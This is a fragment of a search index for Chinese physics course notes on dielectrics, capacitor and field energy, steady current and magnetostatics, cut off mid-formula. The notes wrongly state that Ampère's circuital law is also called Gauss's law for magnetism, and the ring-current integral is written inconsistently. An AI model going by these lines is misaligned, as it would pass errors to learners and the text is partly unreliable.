<p></p>"},{"location":"Courses/Physics/PhysicsII/electricity/#_19","title":"\u7535\u4ecb\u8d28\u4e0b\u7684\u7535\u573a\u5b9a\u7406","text":"<p>\u7535\u4ecb\u8d28\u662f\u7535\u6d41\u4e0d\u80fd\u901a\u8fc7\uff0c\u4f46\u662f\u7a0d\u5fae\u6709\u90a3\u4e48\u4e9b\u5bfc\u7535\u80fd\u529b\u7684\u4ecb\u8d28\uff0c\u4e00\u5b9a\u8981\u6ce8\u610f\u9898\u76ee\u7ed9\u7684\u662f\u5bfc\u4f53\u8fd8\u662f\u7535\u4ecb\u8d28\u3002\u5982\uff1a</p> <p>\u4e00\u7a7a\u6c14\u5e73\u884c\u677f\u7535\u5bb9\u5668\uff0c\u4e24\u677f\u95f4\u8ddd\u4e3a d \uff0c\u6781\u677f\u4e0a\u5e26\u7535\u91cf\u5206\u522b\u4e3a +q \u548c -q \uff0c\u677f\u95f4\u7535\u52bf\u4e3a U \uff0c\u5ffd\u7565\u8fb9\u7f18\u6548\u5e94\uff1b\u5c06\u7535\u6e90\u65ad\u5f00\uff0c\u5728\u4e24\u677f\u95f4\u5e73\u884c\u63d2\u5165\u4e00\u539a\u5ea6\u4e3a t \uff08 t &lt; d \uff09\u7684\u91d1\u5c5e\u677f\uff0c\u5219\u7535\u5bb9\u5668\u7535\u5bb9\u53d8\u4e3a\uff1a</p> \\[ C'=\\frac{d}{d-t}C \\] <p>\u63d2\u5165\u5bfc\u4f53\uff0c\u76f8\u5f53\u4e8e\u4e24\u677f\u4e4b\u95f4\u8ddd\u79bb\u53d8\u77ed\u3002\u7531\u4e8e\u7535\u573a\u5f3a\u5ea6\u4e0d\u53d8:</p> \\[ U' = E(d-t) = \\frac{d-t}{d}U \\] <p>\u6b64\u7c7b\u95ee\u9898\u8fd8\u8981\u6ce8\u610f\u63d2\u5165\u524d\u540e\u662f\u5426\u63a5\u901a\u7535\u6e90\uff0c\u5173\u7cfb\u5230\u662f U \u4e0d\u53d8\u8fd8\u662f q \u4e0d\u53d8</p>"},{"location":"Courses/Physics/PhysicsII/electricity/#_20","title":"\u5e73\u884c\u677f\u7535\u5bb9\u5668\u4e2d\u63d2\u5165\u7535\u4ecb\u8d28","text":"<p>\u5bf9\u5145\u6ee1\u6781\u5316\u7387\u4e3a \\(\\chi_e\\) \u7684\u7535\u4ecb\u8d28\u7684\u65e0\u9650\u5927\u5e73\u884c\u677f\u7535\u5bb9\u5668\uff0c\u8bbe\u5e73\u884c\u677f\u4e0a\u81ea\u7531\u7535\u8377\u5bc6\u5ea6\u4e3a \u00b1\\(\\sigma_0\\) \uff0c\u7535\u4ecb\u8d28\u4e0a\u675f\u7f1a\u7535\u8377\u5bc6\u5ea6\u4e3a \u00b1\\(\\sigma^\\prime\\) </p> <ul> <li>\u81ea\u7531\u7535\u8377\u573a\u5f3a\uff1a\\(|E_0| =\\frac{\\sigma_0}{ \\varepsilon_0}\\)</li> <li>\u675f\u7f1a\u7535\u8377\u573a\u5f3a\uff1a\\(|E^\\prime| =\\frac{\\sigma^\\prime}{ \\varepsilon_0}\\)</li> </ul> <p>\u90a3\u4e48\u548c\u7535\u573a\u573a\u5f3a\u4e3a\uff1a \\(E= E_0 -E^\\prime = \\frac{\\sigma_0}{ \\varepsilon_0} - \\frac{\\sigma^\\prime}{ \\varepsilon_0}\\)</p> <p>\u53c8 \\(\\sigma^\\prime = P=\\chi_e \\varepsilon_0 E\\) \u4ee3\u5165\u4e0a\u5f0f\uff1a</p> \\[ E= E_0 -\\frac{P}{\\varepsilon_0} =E_0 -\\chi_e E \\] <p>\u5373 \\(E = \\frac{E_0}{1+ \\chi_e}\\) \uff0c\u7535\u4ecb\u8d28\u5185\u90e8\u7684\u573a\u5f3a \\(E\\) \u662f\u573a\u5f3a \\(E_0\\) \u7684 \\(\\frac{1}{1+ \\chi_e}\\) \u500d</p> <p>\u5219\u5e73\u884c\u677f\u7535\u5bb9\u5668\u4e24\u6781\u677f\u4e4b\u95f4\u7535\u52bf\u5dee \\(U=Ed=\\frac{\\sigma_0 d}{\\varepsilon_0 (1+\\chi _e)}\\)</p> <p>\u8bbe\u7535\u5bb9\u5668\u6781\u677f\u9762\u79ef\u4e3a \\(S\\) \uff0c\u603b\u7535\u8377\u91cf \\(q=\\sigma_0 S\\) \uff0c\u6309\u7167\u7535\u5bb9\u7684\u5b9a\u4e49\u53ef\u5f97\uff1a</p> \\[ C=\\frac{q}{U} =\\frac{q(1+\\chi_e)}{ E_0d} = (1+\\chi_e) C_0 \\] <p>\u5b9a\u4e49\u76f8\u5bf9\u4ecb\u7535\u5e38\u6570\uff08\u6216\u76f4\u63a5\u79f0\u4e3a\u4ecb\u7535\u5e38\u6570\uff09 \\(\\varepsilon = (1+\\chi_e)\\) \uff0c\u9700\u8981\u6ce8\u610f\u5176\u5b9a\u4e49\u4e0e\u5927\u7269\u7532\u4e2d\u4e0d\u540c</p> <p>\u6c42 \\(\\sigma^\\prime\\)</p> \\[\\sigma^\\prime = P=\\chi_e\\varepsilon_0 E=\\chi_e\\varepsilon_0 \\frac{E_0}{1+ \\chi_e}=\\chi_e\\frac{\\sigma _0}{1+\\chi _e}\\]"},{"location":"Courses/Physics/PhysicsII/electricity/#_21","title":"\u7535\u4ecb\u8d28\u4e0b\u7684\u9ad8\u65af\u5b9a\u7406\u4e0e\u7535\u4f4d\u79fb\u77e2\u91cf","text":"<p>\u9ad8\u65af\u5b9a\u7406\u5728\u6709\u7535\u4ecb\u8d28\u5b58\u5728\u65f6\u53ef\u5199\u4e3a\uff1a</p> \\[ \\oint _S E dS = \\frac{1}{\\varepsilon_0} \\sum_ {S_\u5185}(q _0+ q')  \\] <p>\u5f0f\u4e2d \\(q_0\\) \u548c \\(q'\\) \u5206\u522b\u4e3a\u9ad8\u65af\u9762 \\(S\\) \u5185\u7684\u81ea\u7531\u7535\u8377\u548c\u675f\u7f1a\u7535\u8377</p> <p>\u540c\u65f6\u5bf9\u4e8e\u7535\u6781\u5316\u5f3a\u5ea6 \\(P\\) \uff0c\u6211\u4eec\u6709\u516c\u5f0f\uff1a</p> \\[ \\oint_S PdS = -\\sum_{ S_\u5185} q' \\] <p>\u5e26\u5165\u4e0a\u5f0f\u5e76\u6574\u7406\u5373\u53ef\u5f97\u5230\uff1a</p> \\[ \\oint _S (\\varepsilon_0 E +P) dS = \\sum_ {S_\u5185} q_0 \\] <p>\u4e3a\u4e86\u4e0d\u8003\u8651\u6781\u5316\u7535\u8377\u548c\u9644\u52a0\u7535\u573a\uff0c\u5f15\u5165\u4e86\u7535\u4f4d\u79fb\u77e2\u91cf \\(\\overrightarrow{D}\\)</p> \\[ \\overrightarrow{D} = \\varepsilon_0 \\overrightarrow{E} +\\overrightarrow{P} =(1+\\chi_e) \\varepsilon_0 \\overrightarrow{E}=\\varepsilon \\varepsilon_0 \\overrightarrow{E} \\] <p>\u90a3\u4e48\u7535\u4ecb\u8d28\u4e2d\u7684\u9ad8\u65af\u5b9a\u7406\u6ee1\u8db3\uff1a</p> \\[ \\oint _S \\overrightarrow{D}\\cdot d\\overrightarrow{S} =\\sum q_0 \\] <p>\u5373\uff0c\u901a\u8fc7\u7535\u573a\u4e2d\u4efb\u610f\u95ed\u5408\u66f2\u9762\u7684\u4f4d\u79fb\u7535\u901a\u91cf\uff0c\u7b49\u4e8e\u8be5\u95ed\u5408\u9762\u6240\u5305\u56f4\u7684\u81ea\u7531\u7535\u8377\u7684\u4ee3\u6570\u548c</p> <p>\u9047\u5230\u6c42\u675f\u7f1a\u7535\u8377\u9762\u5bc6\u5ea6\u5927\u9898\uff0c\u8981\u5148\u6c42\u51fa \\(\\overrightarrow{P}\\)\uff0c\u518d\u4e58\u4e0a\u89d2\u5ea6\u5373\u53ef(\u4e00\u822c\u7535\u5bb9\u5668\u4e24\u4e2a\u677f\u5bc6\u5ea6\u76f8\u53cd)</p>"},{"location":"Courses/Physics/PhysicsII/electricity/#_22","title":"\u9759\u7535\u573a\u7684\u80fd\u91cf","text":""},{"location":"Courses/Physics/PhysicsII/electricity/#_23","title":"\u70b9\u7535\u8377\u7cfb\u7edf\u4e2d\u7684\u80fd\u91cf","text":"<p>\u70b9\u7535\u8377\u7cfb\u7edf\u7684\u603b\u80fd\u91cf\u53ef\u4ee5\u8868\u793a\u4e3a\uff1a</p> \\[ W= \\frac{1}{2} \\sum q_i U_i \\] <p>\u5176\u4e2d \\(U_i\\) \u4e3a\u5728\u70b9\u7535\u8377 \\(q_i\\) \u6240\u5728\u5904\u7531 \\(q_i\\) \u4ee5\u5916\u5176\u5b83\u6240\u6709\u7535\u8377\u6240\u4ea7\u751f\u7684\u7535\u52bf</p> <p>\u82e5\u7535\u8377\u8fde\u7eed\u5206\u5e03\uff0c\u5219\u6539\u6210\u5fae\u5143\u79ef\u5206\u5f62\u5f0f\u5373\u53ef</p>"},{"location":"Courses/Physics/PhysicsII/electricity/#_24","title":"\u7535\u5bb9\u5668\u7684\u80fd\u91cf","text":"\\[ W= \\frac{1}{2} \\frac{Q^2}{C}= \\frac{1}{2}CU^2 \\]"},{"location":"Courses/Physics/PhysicsII/electricity/#_25","title":"\u7535\u573a\u7684\u80fd\u91cf","text":"<p>\u5b9a\u4e49\u7535\u80fd\u5bc6\u5ea6:</p> \\[ \\omega_e = \\frac{W}{V} = \\frac{1}{2}\\varepsilon \\varepsilon_0 E^2 = \\frac{1}{2}DE \\] <p>\u975e\u5747\u5300\u7535\u573a\u7684\u80fd\u91cf\u5373\u53ef\u7528\u5982\u4e0b\u65b9\u5f0f\u8ba1\u7b97\uff1a</p> \\[ W=\\int _V \\omega_e dV \\] <p>\u5f80\u5f80\u7528\u5230\u4e09\u91cd\u79ef\u5206</p> <p></p>"},{"location":"Courses/Physics/PhysicsII/electromagnetism/","title":"\u7535\u78c1\u5b66\u90e8\u5206","text":"<p> \u7ea6 4938 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 25 \u5206\u949f</p>"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_1","title":"\u7a33\u6052\u7535\u6d41","text":""},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_2","title":"\u5b9a\u4e49","text":"<ul> <li>\u7535\u6d41\uff1a \u7535\u8377\u7684\u5b9a\u5411\u79fb\u52a8\uff0c\u4ea7\u751f\u6761\u4ef6\u6709\u4e8c<ul> <li>\uff081\uff09\u5b58\u5728\u81ea\u7531\u7535\u8377</li> <li>\uff082\uff09\u5b58\u5728\u7535\u573a</li> </ul> </li> <li>\u8f7d\u6d41\u5b50\uff1a \u7535\u8377\u7684\u643a\u5e26\u8005<ul> <li>\u81ea\u7531\u7535\u5b50</li> <li>\u81ea\u7531\u79bb\u5b50</li> <li>\u7535\u5b50-\u7a7a\u7a74\u5bf9\uff08\u534a\u5bfc\u4f53P\u578b\u7a7a\u7a74\u591a\uff0cN\u578b\u7535\u5b50\u591a\uff09</li> </ul> </li> <li>\u4f20\u5bfc\u7535\u6d41\uff1a \u81ea\u7531\u7535\u5b50\u3001\u7a7a\u7a74\u3001\u79bb\u5b50\u5728\u5bfc\u4f53\u4e2d\u5b9a\u5411\u79fb\u52a8\u5f62\u6210</li> <li>\u7535\u6d41\u5f3a\u5ea6\uff1a \u5355\u4f4d\u65f6\u95f4\u5185\u901a\u8fc7\u5bfc\u4f53\u4efb\u4e00\u622a\u9762\u7684\u7535\u91cf\uff08\u6807\u91cf\uff09\uff0c\u5355\u4f4d\u4e3a\u5b89\u57f9<ul> <li>\\(I= dq / dt\\)</li> </ul> </li> <li>\u7535\u6d41\u5bc6\u5ea6\uff1a \u63cf\u8ff0\u5bfc\u4f53\u5185\u4e00\u70b9\u7684\u7535\u6d41\u60c5\u51b5\uff08\u77e2\u91cf\uff09<ul> <li>\\(dI= \\overrightarrow{j}\\cdot d\\overrightarrow{S}\\)</li> <li>\\(I=\\int_S jdS\\)</li> <li>\\(j=-nev\\)</li> </ul> </li> <li>\u7535\u6d41\u7ebf\uff1a \u7535\u6d41\u5bc6\u5ea6 \\(j\\) \u5f62\u6210\u7684\u77e2\u91cf\u573a\u6210\u4e3a\u7535\u6d41\u573a\uff0c\u53ef\u5f15\u8fdb\u7535\u6d41\u7ebf\u6765\u63cf\u8ff0\u7535\u6d41\u573a\u7684\u5206\u5e03\uff0c\u5176\u5177\u6709\u4ee5\u4e0b\u7279\u70b9<ul> <li>\uff081\uff09\u7535\u6d41\u7ebf\u5207\u7ebf\u65b9\u5411\u4e3a\u7535\u6d41\u5bc6\u5ea6 \\(j\\) \u7684\u65b9\u5411</li> <li>\uff082\uff09\u7535\u6d41\u7ebf\u5bc6\u5904 \\(j\\) \u5927\uff0c\u758f\u5904 \\(j\\) \u5c0f</li> <li>\uff083\uff09\u4e24\u7535\u6d41\u7ebf\u4e0d\u76f8\u4ea4</li> </ul> </li> </ul> <p>\u641e\u6e05\u695a\u81ea\u5df1\u5728\u6c42\u4ec0\u4e48</p> \u9898\u9762\u7b54\u6848 <p>\u6709\u4e00\u5bfc\u4f53\u5706\u7b52\uff0c\u957f\u5ea6\u4e3a 20m\uff0c\u5185\u534a\u5f84\u4e3a 3mm\uff0c\u5916\u534a\u5f84\u4e3a 9mm\uff0c\u82e5\u6cbf\u5706\u7b52\u5f84\u5411\u6709 10mA \u7535\u6d41\u901a\u8fc7\uff0c\u5219\u901a\u8fc7\u534a\u5f84\u4e3a 6mm \u7684\u5706\u67f1\u9762\u4e0a\u7684\u7535\u6d41\u5bc6\u5ea6\u4e3a\uff1f </p> \\[j_m=\\frac{I}{S}=\\frac{I}{2\\pi rl}=\\frac{10}{2\\pi \\cdot 6\\cdot 20}\\]"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_3","title":"\u7535\u6d41\u5bc6\u5ea6\u4e0e\u6f02\u79fb\u901f\u5ea6\u7684\u5173\u7cfb","text":"<p><code>j=-nev</code></p> <p></p>"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_4","title":"\u7535\u52a8\u52bf","text":"<p>\u7535\u52a8\u52bf \\(\\varepsilon\\) \u662f\u6307\u7535\u6e90\u5185\u90e8\uff0c\u5c06\u5355\u4f4d\u6b63\u7535\u8377\u4ece\u8d1f\u6781\u79fb\u52a8\u5230\u6b63\u6781\u65f6\u975e\u9759\u7535\u529b\u6240\u4f5c\u7684\u529f</p> \\[ \\varepsilon = \\frac{A_k}{q} \\]"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_5","title":"\u7a33\u6052\u78c1\u573a","text":""},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_6","title":"\u78c1\u611f\u5e94\u5f3a\u5ea6","text":"<p>\u8fd0\u52a8\u7535\u8377\u5728\u5176\u5468\u56f4\u7a7a\u95f4\u4ea7\u751f\u78c1\u573a\uff0c\u901a\u8fc7\u78c1\u573a\u5bf9\u5176\u5b83\u8fd0\u52a8\u7535\u8377\u65bd\u52a0\u4f5c\u7528\u529b</p> <p>\u78c1\u611f\u5e94\u5f3a\u5ea6 B \u53cd\u6620\u573a\u5185\u67d0\u70b9\u7684\u78c1\u573a\u65b9\u5411\u4e0e\u5f3a\u5f31\uff08\u77e2\u91cf\u573a\uff09\uff0c\u5355\u4f4d\u4e3a\u7279\u65af\u62c9\uff08T\uff09\u3002\u5219\u8fd0\u52a8\u7535\u8377\u4ee5\u901f\u5ea6 v \u5728\u78c1\u611f\u5e94\u5f3a\u5ea6\u4e3a B \u7684\u67d0\u70b9\u8fd0\u52a8\u65f6\uff0c\u53d7\u5230\u7684\u6d1b\u4f26\u5179\u529b\u4e3a\uff1a</p> \\[ \\overrightarrow{F}= q\\overrightarrow{v}\\times \\overrightarrow{B} \\] <p>\u78c1\u611f\u5e94\u7ebf\u7279\u70b9\uff1a</p> <ul> <li>\uff081\uff09\u78c1\u611f\u5e94\u7ebf\u4e3a\u95ed\u5408\u66f2\u7ebf\uff0c\u76f8\u5e94\u7684\u78c1\u573a\u79f0\u6da1\u65cb\u573a</li> <li>\uff082\uff09\u78c1\u611f\u5e94\u7ebf\u7684\u73af\u7ed5\u65b9\u5411\u4e0e\u7535\u6d41\u65b9\u5411\u670d\u4ece\u53f3\u624b\u87ba\u65cb\u6cd5\u5219</li> </ul> <p>\u53f3\u624b\u87ba\u65cb\u6cd5\u5219</p> <p>\u82e5\u662f\u76f4\u7ebf\u7535\u6d41\u4ea7\u751f\u7684\u78c1\u573a\uff0c\u5927\u62c7\u6307\u6307\u5411\u7535\u6d41\u65b9\u5411\uff0c\u5219\u5176\u5b83\u56db\u6307\u7684\u7ed5\u884c\u65b9\u5411\u5c31\u662f B \u7684\u65b9\u5411</p> <p>\u82e5\u662f\u73af\u5f62\u7535\u6d41\u4ea7\u751f\u7684\u78c1\u573a\uff0c\u5176\u5b83\u56db\u6307\u7684\u7ed5\u884c\u65b9\u5411\u4e3a\u7535\u6d41\u65b9\u5411\uff0c\u5219\u5927\u62c7\u6307\u6307\u5411 B \u7684\u65b9\u5411</p> <p>\u7531\u4e8e\u8fd0\u52a8\u7535\u8377\u4e4b\u95f4\u7684\u78c1\u76f8\u4e92\u4f5c\u7528\u529b\u662f\u4e00\u79cd\u76f8\u5bf9\u8bba\u6548\u5e94\uff0c\u78c1\u529b\u6bd4\u7535\u529b\u5c0f\u5f97\u591a\uff0c\u56e0\u6b64\u7814\u7a76\u4e24\u4e2a\u8fd0\u52a8\u7535\u8377\u4e4b\u95f4\u7684\u529b\u53ef\u4ee5\u5c06\u6d1b\u4f26\u5179\u529b\u5ffd\u7565\uff08\u5199\u9898\u65f6\u53ef\u80fd\u4e0d\u884c \ud83d\ude02\uff09</p>"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#-","title":"\u6bd5\u5965-\u8428\u4f10\u5c14\u5b9a\u5f8b","text":"<p>\u7535\u6d41\u5143 \\(Idl\\) \u5728\u7a7a\u95f4 P \u70b9\u6fc0\u53d1\u7684\u78c1\u611f\u5e94\u5f3a\u5ea6\u516c\u5f0f\u4e3a\uff1a</p> \\[d\\overrightarrow{B}= \\frac{\\mu _0}{4\\pi} \\frac{Id\\overrightarrow{l}\\times \\overrightarrow{r}}{ r^2\\cdot r} \\] <p>\u5176\u4e2d \\(\\overrightarrow{r}\\) \u4e3a\u7535\u6d41\u5143\u6307\u5411 P \u70b9\u7684\u77e2\u91cf\uff0c\\(\\mu_0\\) \u4e3a\u771f\u7a7a\u78c1\u5bfc\u7387\uff0c\u5927\u5c0f \\(4\\pi\\times 10^{-7}\\ N/A^2\\)</p> <p>\u5bf9\u4e8e\u78c1\u611f\u5e94\u5f3a\u5ea6\uff0c\u540c\u6837\u6709\u53e0\u52a0\u539f\u7406\uff0c\u5219\u4efb\u610f\u8f7d\u6d41\u5bfc\u7ebf\u6240\u6fc0\u53d1\u7684\u603b\u78c1\u611f\u5e94\u5f3a\u5ea6\u4e3a \\(d\\overrightarrow{B}\\) \u5bf9 \\(r\\) \u79ef\u5206</p> <p>\\(Idl\\) \u4ea6\u53ef\u4ee5\u53d8\u6210 \\(vdq\\)</p> \u8f7d\u6d41\u957f\u76f4\u5bfc\u7ebf\u8f7d\u6d41\u5706\u7ebf\u5708\u8f74\u7ebf <p></p> \\[\\begin{array}c B=\\int_L \\frac{\\mu_0}{4\\pi} \\frac{Idl\\sin \\theta}{r^2} \\\\ l=a\\cot (\\pi-\\theta) \\Rightarrow dl=a\\csc ^2\\theta d\\theta \\\\  B=\\frac{\\mu_0I}{4\\pi a}\\int^{\\theta_2} _{\\theta _1} \\sin \\theta d\\theta =\\frac{\\mu_0I}{4\\pi a}(\\cos \\theta_1 -\\cos \\theta_2) \\end{array}\\] <p>\u5f53 \\(L&gt;&gt;a\\) \u65f6\uff0c\\(\\theta_1 = 0,\\theta_2=\\pi\\) \uff0c\u90a3\u4e48\u6709\uff1a</p> \\[B=\\frac{\\mu_0I}{2\\pi a}\\] <p></p> <p>\u5c06 \\(\\cos \\theta=\\frac{R}{r}= \\frac{R}{\\sqrt{R^2 +x^2}}\\) \u5e26\u5165\uff1a</p> \\[\\begin{array}c B=\\int ^{2\\pi R}_0 \\frac{\\mu_0IR}{4\\pi(R ^2+ x^2) ^{3 / 2}} dx=  \\frac{\\mu_0IR^2}{2(R ^2+ x^2) ^{3 / 2}} \\end{array}\\] <p>\u8ba8\u8bba\u4e24\u5904\u7279\u6b8a\u70b9\u60c5\u51b5\uff1a</p> <p>\uff081\uff09\u5706\u5fc3\u89d2\u4e3a\\(\\theta\\)\u7684\u5706\u5f27\u7535\u6d41\u5728\u5706\u5fc3\u5904(\u5706\u7ebf\u5708\u5bc6\u7ed5N\u531d)\uff0c\\(x=0\\) \uff1a\\(B=\\frac{\\mu_0I\\theta N}{4\\pi R}\\)</p> <p>\uff082\uff09\u5728\u8f74\u7ebf\u4e0a\u8fdc\u79bb\u5706\u7ebf\u5708\uff0c\\(x&gt;&gt;R\\) \uff1a\\(B=\\frac{\\mu_0 IR^2}{2 x^3} = \\frac{\\mu_0 IS}{2\\pi x^3}\\)</p> <p>\u5728\u6c42\u7535\u6d41\u5728\u67d0\u70b9\u78c1\u611f\u5e94\u5f3a\u5ea6\u65f6\uff0c\u8981\u6ce8\u610f\u78c1\u573a\u65b9\u5411\u5e76\u4e0d\u662f\u4e24\u70b9\u4e4b\u95f4\u7684\u65b9\u5411\uff0c\u800c\u662f\u5782\u76f4\u7684</p>"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_7","title":"\u78c1\u5076\u6781\u5b50","text":"<p>\u5f15\u5165\u78c1\u77e9 \\(p_m\\) \u6765\u63cf\u8ff0\u8f7d\u6d41\u7ebf\u5708\u7684\u78c1\u6027\u8d28\uff1a</p> \\[p_m=NISn\\] <p>\u5176\u4e2d\u5355\u4f4d\u77e2\u91cf \\(n\\) \u65b9\u5411\u4e0e\u7535\u6d41\u73af\u7ed5\u65b9\u5411\u5448\u53f3\u624b\u87ba\u65cb\u5173\u7cfb</p> <p>\u5f15\u5165\u78c1\u77e9\u6982\u5ff5\u540e\uff0c\u5728\u8f74\u7ebf\u4e0a\u8fdc\u79bb\u8f7d\u6d41\u5706\u7ebf\u5708\u7684\u78c1\u573a\u4e3a\uff1a</p> \\[ B=\\frac{\\mu_0p _m}{2\\pi x^3}\\] <p>\u573a\u70b9\u5230\u573a\u6e90\u7684\u8ddd\u79bb\u8fdc\u5927\u4e8e\u7ebf\u5708\u5c3a\u5bf8\u7684\u8f7d\u6d41\u7ebf\u5708\u79f0\u4e3a\u78c1\u5076\u6781\u5b50\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u8f6c\u52a8\u7684\u5e26\u7535\u7403\u4f53\u7b49\u6548\u4e8e\u4e00\u4e2a\u5706\u5f62\u7535\u6d41\uff0c\u5728\u8fdc\u5904\u53ef\u770b\u4f5c\u78c1\u5076\u6781\u5b50\u7684\u573a\uff08\u5982\u5730\u7403\u7684\u78c1\u573a\uff09</p>"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_8","title":"\u8fd0\u52a8\u7535\u8377\u7684\u78c1\u573a","text":"<p>\u7535\u8377\u7684\u5b9a\u5411\u8fd0\u52a8\u5f62\u6210\u7535\u6d41\uff0c\u53ef\u4ece\u6bd5\u5965-\u8428\u4f10\u5c14\u5b9a\u5f8b\u63a8\u5bfc\u51fa\u8fd0\u52a8\u7535\u8377\u7684\u78c1\u573a\u8868\u8fbe\u5f0f</p> <p>\u8bbe\u5e26\u7535\u7c92\u5b50\u6570\u5bc6\u5ea6\u4e3a \\(n\\) \uff0c\u6bcf\u7535\u8377\u5e26\u7535\u91cf\u4e3a \\(q\\) \uff0c\u6f02\u79fb\u901f\u5ea6\u4e3a \\(v\\) \uff0c\u7535\u6d41\u5143 \\(Idl\\) \uff0c\u5bfc\u4f53\u7684\u622a\u9762\u4e3a \\(S\\) \uff0c\u5219\uff1a</p> \\[j=qnv\\ ,\\ I=qnvS\\] <p>\u4e0d\u60f3\u8bc1\u660e\u4e86...\u8fd8\u662f\u8bb0\u7ed3\u679c\u5427</p> <p>\u603b\u4e4b\uff0c\u5355\u4e2a\u7535\u8377 \\(q\\) \u4ee5\u901f\u5ea6 \\(v\\) \u8fd0\u52a8\u4ea7\u751f\u7684\u78c1\u611f\u5e94\u5f3a\u5ea6\u4e3a\uff1a</p> \\[B=\\frac{\\mu_0}{4\\pi} \\frac{qv\\times \\overrightarrow{r}}{r^2 \\cdot r}\\]"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_9","title":"\u78c1\u573a\u7684\u9ad8\u65af\u5b9a\u7406\u4e0e\u5b89\u57f9\u73af\u8def\u5b9a\u7406","text":"<p>\u5b89\u57f9\u73af\u8def\u5b9a\u7406\u4e5f\u88ab\u79f0\u4e3a\u78c1\u573a\u7684\u9ad8\u65af\u5b9a\u7406</p> <p>\u5bf9\u95ed\u5408\u66f2\u9762 \\(S\\) \uff0c\u53d6\u5916\u6cd5\u7ebf\u4e3a\u6b63\uff0c\u78c1\u529b\u7ebf\u4ece\u95ed\u5408\u66f2\u9762\u7a7f\u51fa\uff0c\u8bb0\u78c1\u901a\u91cf\u4e3a\u6b63\uff0c\u7a7f\u5165\u5219\u4e3a\u8d1f\uff0c\u5219\u6709\uff1a</p> \\[\\iint_S \\overrightarrow{B}d\\overrightarrow{S} = 0\\] <p>\u78c1\u573a\u7684\u9ad8\u65af\u5b9a\u7406\u53cd\u6620\u4e86\u65e0\u6e90\u573a\u7684\u7279\u6027\uff1b\u7535\u573a\u7684\u9ad8\u65af\u5b9a\u7406\u53cd\u6620\u4e86\u6709\u6e90\u573a\u7684\u7279\u6027\u3002</p> <p>\u6211\u4eec\u5728\u7814\u7a76\u9759\u7535\u573a\u65f6\uff0c\u5f97\u5230\u9759\u7535\u573a\u7684\u73af\u6d41\u4e3a\u96f6\uff1b\u4f46\u5bf9\u78c1\u573a\u800c\u8a00\uff0c\u7531\u4e8e\u78c1\u611f\u5e94\u7ebf\u662f\u95ed\u5408\u7684\uff0cB \u7684\u73af\u6d41\u4e0d\u4e3a\u96f6\u3002</p> <p>\u5728\u7a33\u6052\u78c1\u573a\u4e2d\uff0c\u78c1\u611f\u5e94\u5f3a\u5ea6 \\(B\\) \u6cbf\u4efb\u4f55\u56de\u8def\u7684\u7ebf\u79ef\u5206\u7b49\u4e8e\u95ed\u5408\u56de\u8def\u6240\u5305\u56f4\u7535\u6d41\u7684\u4ee3\u6570\u548c\u7684 \\(\\mu_0\\) \u500d\uff1a</p> \\[ \\oint_L \\overrightarrow{B}d\\overrightarrow{l} = \\mu_0\\sum I_\u5185 \\] <p></p>"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_10","title":"\u78c1\u573a\u5bf9\u7535\u6d41\u7684\u4f5c\u7528","text":""},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_11","title":"\u5b89\u57f9\u529b","text":"<p>\u8f7d\u6d41\u5bfc\u7ebf\u5728\u78c1\u573a\u4e2d\u5c06\u53d7\u5230\u529b\u7684\u4f5c\u7528\uff0c\u79f0\u8fd9\u79cd\u529b\u4e3a\u5b89\u57f9\u529b</p> <p>\u5bf9\u4e8e\u67d0\u7535\u6d41\u5143 \\(Idl\\) \uff0c\u5176\u53d7\u5230\u7684\u5b89\u57f9\u529b\u4e3a\uff1a</p> \\[ d\\overrightarrow{F}=Id\\overrightarrow{l}\\times \\overrightarrow{B} \\] <p>\u5728\u5747\u5300\u78c1\u573a\u4e2d\uff0c\u4e00\u6bb5\u5f2f\u66f2\u5bfc\u7ebf\u6536\u5230\u7684\u5b89\u57f9\u529b\u548c\u7edf\u4e00\u8d77\u70b9\u7ec8\u70b9\u7684\u76f4\u5bfc\u7ebf\u76f8\u540c</p> <p>\u5b9a\u4e49\u4e00\u95ed\u5408\u56de\u8def\u7684\u78c1\u77e9\u4e3a\uff1a</p> \\[ p_m = NISn \\] <p>\u5176\u4e2d\u5355\u4f4d\u77e2\u91cf \\(n\\) \u65b9\u5411\u4e0e\u7535\u6d41\u73af\u7ed5\u65b9\u5411\u5448\u53f3\u624b\u87ba\u65cb\u5173\u7cfb</p> \u9898\u9762\u89e3\u7b54 <p>\u4ece\u7ecf\u5178\u89c2\u70b9\u770b\uff0c\u6c22\u539f\u5b50\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u4e2a\u7535\u5b50\u7ed5\u6838\u4f5c\u9ad8\u901f\u65cb\u8f6c\u7684\u4f53\u7cfb\uff0c\u5df2\u77e5\u7535\u5b50\u548c\u8d28\u5b50\u7684\u7535\u8377\u5206\u522b\u4e3a \\(-e\\) \u548c \\(e\\) \uff0c\u7535\u5b50\u8d28\u91cf\u4e3a \\(m_e\\) \uff0c\u6c22\u539f\u5b50\u7684\u5706\u8f68\u9053\u534a\u5f84\u4e3a \\(r\\) \uff0c\u7535\u5b50\u4f5c\u5e73\u9762\u8f68\u9053\u8fd0\u52a8\uff0c\u5219\u7535\u5b50\u8f68\u9053\u8fd0\u52a8\u7684\u78c1\u77e9\u4e3a\uff08\uff09</p> <p>\u7531\u5e93\u4f26\u5b9a\u5f8b\u548c\u5706\u5468\u8fd0\u52a8\uff0c\u7535\u5b50\u7ed5\u6838\u7684\u7ebf\u901f\u5ea6\uff1a</p> \\[\\frac{e^2}{4\\pi \\varepsilon_0 r^2}=m_e\\frac{ v^2}{r}\\Rightarrow v=\\frac{e}{\\sqrt{4\\pi m_e \\varepsilon_0 r}}\\] <p>\u6839\u636e\u7535\u6d41\u7684\u5b9a\u4e49\u53ef\u5f97\uff1a</p> \\[I=nev=e\\frac{v}{2\\pi r}\\] <p>\u6240\u4ee5\u78c1\u77e9\u4e3a\uff1a</p> \\[p_m=IS= I\\cdot \\pi r^2 = 